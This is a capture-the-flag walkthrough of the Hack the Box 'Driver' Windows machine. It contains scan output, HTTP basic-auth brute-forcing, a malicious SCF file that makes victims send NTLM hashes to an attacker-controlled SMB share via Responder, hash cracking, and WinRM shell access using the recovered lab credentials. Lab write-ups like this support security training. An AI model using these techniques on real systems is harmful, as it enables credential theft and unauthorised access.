# Hack the Box - Driver

```CSS
rustscan -a 10.10.11.106 -r 0-65535 --ulimit 5000
```
```CSS
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.106:80
Open 10.10.11.106:135
Open 10.10.11.106:445
Open 10.10.11.106:5985
[~] Starting Script(s)
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 12:05 IST
Initiating Ping Scan at 12:05
Scanning 10.10.11.106 [2 ports]
Completed Ping Scan at 12:05, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:05
Completed Parallel DNS resolution of 1 host. at 12:05, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:05
Scanning 10.10.11.106 [4 ports]
Discovered open port 80/tcp on 10.10.11.106
Discovered open port 135/tcp on 10.10.11.106
Discovered open port 445/tcp on 10.10.11.106
Discovered open port 5985/tcp on 10.10.11.106
Completed Connect Scan at 12:05, 0.15s elapsed (4 total ports)
Nmap scan report for 10.10.11.106
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-09-17 12:05:49 IST for 0s

PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
445/tcp  open  microsoft-ds syn-ack
5985/tcp open  wsman        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

```CSS
nmap -sC -sV 10.10.11.106 -p 80,135,445,5985
```
```CSS
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 12:28 IST
Nmap scan report for 10.10.11.106
Host is up (0.15s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2023-09-17T13:58:28
|_  start_date: 2023-09-17T13:30:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.67 seconds
```

HTTP:80
```HTTP
http://10.10.11.106/
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fb3fbdf9-f765-4378-b4c7-304bf9e4b572)

Brute-force Basic HTTP Authentication
```CSS
hydra -l admin -P ~/Wordlists/passwords-common.txt 10.10.11.106 http-get
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/34d7e7e1-12c3-4e23-80f7-54485d90f407)

Login successful using credentials: `admin:admin`
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c9faf283-3920-4f1a-b18d-f986b8327a7f)

Authenticated Directories and Files
```CSS
feroxbuster -u http://10.10.11.106 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php -H 'Authorization: Basic YWRtaW46YWRtaW4=' -s 200 -n
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c04eb4a7-1cee-4c60-ad33-f2f0d5a19821)

Firmware Update
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/29efdec0-7744-4955-a5ea-1e2cdedc0d10)

SMB File Upload
- This [blog](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) suggests that by crafting a malicious SCF file and placing it somewhere in network shares, we can automatically capture a user's NTLM password hashes when they access the share.

Contents of the `payload.scf` file.
```CSS
[Shell]
Command=2
IconFile=\\10.10.14.14\tools\responder.ico
[Taskbar]
Command=ToggleDesktop
```

Upload File
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/67073226-d33c-4442-8199-8c489f76d602)

Get NTLM Password Hash
```CSS
responder.py -I tun0
```
What is Responder?
Responder enables DNS poisoning on a target, along with built-in auth servers for HTTP, SMB, FTP, LDAP and MSSQL protocols, and also supports the NTLM authentication protocol (Windows Challenge/Response), which is used by the Microsoft Windows operating systems. Responder can be described as a program which listens for any outbound request from a machine to the outside network, like an FTP request, and then falsely represents itself as the requested server, enabling it to intercept all communication between the targeted machine and the server.

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dfba4d5b-4300-4709-94e4-9334bd6ec04b)

Depending on the protocol and the type of authentication, Responder forwards the auth request towards the server, which can in turn respond with a challenge that the target has to respond to in order to successfully authenticate. Responder forwards that challenge towards the target, to which the targeted PC responds with a generated response, possibly a hash of its password made using the challenge sent by the server, which it sends back to the Responder, thinking it’s in fact, the target server.

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/986a37ae-1c85-4065-b026-3658bc612df6)
```Hash
tony::DRIVER:9ceecf21a93f312e:BDB5E4396EDEE360EAF01C0600802ED4:0101000000000000001399CB81E9D901A6E289629CFE18020000000002000800460030004C00460001001E00570049004E002D004F0051004C0047004600520036003400530033004F0004003400570049004E002D004F0051004C0047004600520036003400530033004F002E00460030004C0046002E004C004F00430041004C0003001400460030004C0046002E004C004F00430041004C0005001400460030004C0046002E004C004F00430041004C0007000800001399CB81E9D901060004000200000008003000300000000000000000000000002000007256B61760A63AC90A0EEB2BD3DC357C3ABADBD5FA4ED983D5D5049C0D2BD2170A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000
```

Crack NTLM Password Hash
```CSS
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ntlm.hash
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/593049c4-b06b-4a12-86c8-3a465fe42584)

SMB Enumeration
```CSS
crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony' --shares

SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
SMB         10.10.11.106    445    DRIVER           [+] Enumerated shares
SMB         10.10.11.106    445    DRIVER           Share           Permissions     Remark
SMB         10.10.11.106    445    DRIVER           -----           -----------     ------
SMB         10.10.11.106    445    DRIVER           ADMIN$                          Remote Admin
SMB         10.10.11.106    445    DRIVER           C$                              Default share
SMB         10.10.11.106    445    DRIVER           IPC$                            Remote IPC
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/543ce28c-ab6c-4609-a3c2-f5a28fe992b5)

WinRM
Verify credentials
```CSS
crackmapexec winrm 10.10.11.106 -u tony -p liltony
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7f13374d-bbc0-4d34-b183-3a397bed36e5)

EvilWinRM
```CSS
evil-winrm -i 10.10.11.106 -u tony -p liltony -s scripts -e exes
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/20174a10-f48e-4cfc-b648-aa77144eba46)

Upload WinPEAS
Switch to the `C:\programdata` directory and upload `WinPEASany.exe`. 
```CSS
*Evil-WinRM* PS C:\programdata> upload winPEASany.exe
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3d5623e5-2dfd-4602-805a-6fbe3a7180bc)

